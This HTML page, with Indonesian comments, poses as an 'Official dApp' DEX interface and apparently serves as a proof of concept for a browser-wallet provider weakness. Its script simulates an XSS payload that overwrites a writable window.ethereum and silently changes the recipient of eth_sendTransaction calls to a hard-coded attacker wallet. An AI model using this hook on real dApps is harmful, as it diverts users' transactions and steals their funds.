<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Official dApp - Production Environment</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0b0e11; color: #eaecef; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #181a20; padding: 24px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.5); border: 1px solid #2b313a; }
        h2 { margin-top: 0; color: #f0b90b; font-size: 20px; text-align: center; }
        .input-box { background: #2b313a; padding: 12px; border-radius: 8px; margin-bottom: 16px; }
        .label { font-size: 12px; color: #848e9c; margin-bottom: 4px; display: block; }
        .value { font-size: 18px; font-weight: bold; }
        button { background: #f0b90b; color: #000; border: none; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
        button:hover { background: #fcd535; }
        #log { margin-top: 15px; font-family: monospace; font-size: 11px; color: #00ff00; white-space: pre-wrap; word-wrap: break-word; background: #0b0e11; padding: 10px; border-radius: 6px; border: 1px solid #2b313a; max-height: 120px; overflow-y: auto; }
    </style>
</head>
<body>

<div class="card">
    <h2>DEX Liquidity Pool</h2>
    <p style="font-size: 13px; color: #848e9c; text-align: center;">Official dApp Interface</p>
    
    <div class="input-box">
        <span class="label">Action</span>
        <span class="value">Deposit & Stake</span>
    </div>

    <!-- Tombol fungsi asli dari dApp yang sah -->
    <button id="legitBtn">Proceed Transaction</button>
    
    <div id="log">Status: Loading dApp environment...</div>
</div>

<!-- 
  =================================================================
  SIMULASI VEKTOR XSS NYATA PADA ORIGIN DAPP
  Membuktikan bahwa ketika XSS terjadi di dApp, writable: true 
  memungkinkan penyerang membajak transaksi dApp tersebut secara senyap.
  =================================================================
-->
<script>
const logEl = document.getElementById('log');
function addLog(msg) {
    logEl.innerText += '\n' + msg;
}

// Mensimulasikan eksekusi payload XSS yang berhasil masuk ke origin dApp
(function simulateXSSInjection() {
    addLog("[!] XSS Payload executed inside dApp origin.");
    
    if (!window.ethereum) {
        addLog("[-] window.ethereum not found.");
        return;
    }

    const desc = Object.getOwnPropertyDescriptor(window, 'ethereum');
    addLog(`[i] window.ethereum Writable: ${desc.writable}`);

    if (!desc.writable) {
        addLog("[-] Provider is immutable. Attack mitigated.");
        return;
    }

    const attackerWallet = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
    const originalProvider = window.ethereum;

    // Membajak objek global ethereum karena sifatnya yang writable
    window.ethereum = {
        selectedAddress: originalProvider.selectedAddress,
        chainId: originalProvider.chainId,
        request: async (args) => {
            if (args.method === "eth_sendTransaction" && args.params?.[0]) {
                addLog(`[!] XSS Hook: Original target -> ${args.params[0].to}`);
                // Mengubah alamat tujuan secara diam-diam ke dompet penyerang
                args.params[0].to = attackerWallet;
                addLog(`[!] XSS Hook: Target redirected to attacker!`);
            }
            return originalProvider.request(args);
        }
    };

    addLog("[+] XSS successfully hijacked window.ethereum globally.");
})();

// Event handler tombol asli dApp yang diklik oleh korban
document.getElementById('legitBtn').addEventListener('click', async () => {
    try {
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        addLog(`[+] User Account: ${accounts[0].substring(0, 6)}...`);

        addLog("[*] Executing dApp smart contract call...");
        // dApp memanggil transaksi ke kontrak aslinya, namun dibelokkan oleh XSS hook di atas
        await window.ethereum.request({
            method: "eth_sendTransaction",
            params: [{
                from: accounts[0],
                to: "0x7a250d5630b4cf539739df2c5dacb4c659f2488d", // Smart contract asli dApp
                value: "0x0"
            }]
        });
        addLog("[+] Transaction flow finished.");
    } catch (e) {
        addLog(`[-] Error: ${e.message}`);
    }
});
</script>

</body>
</html>
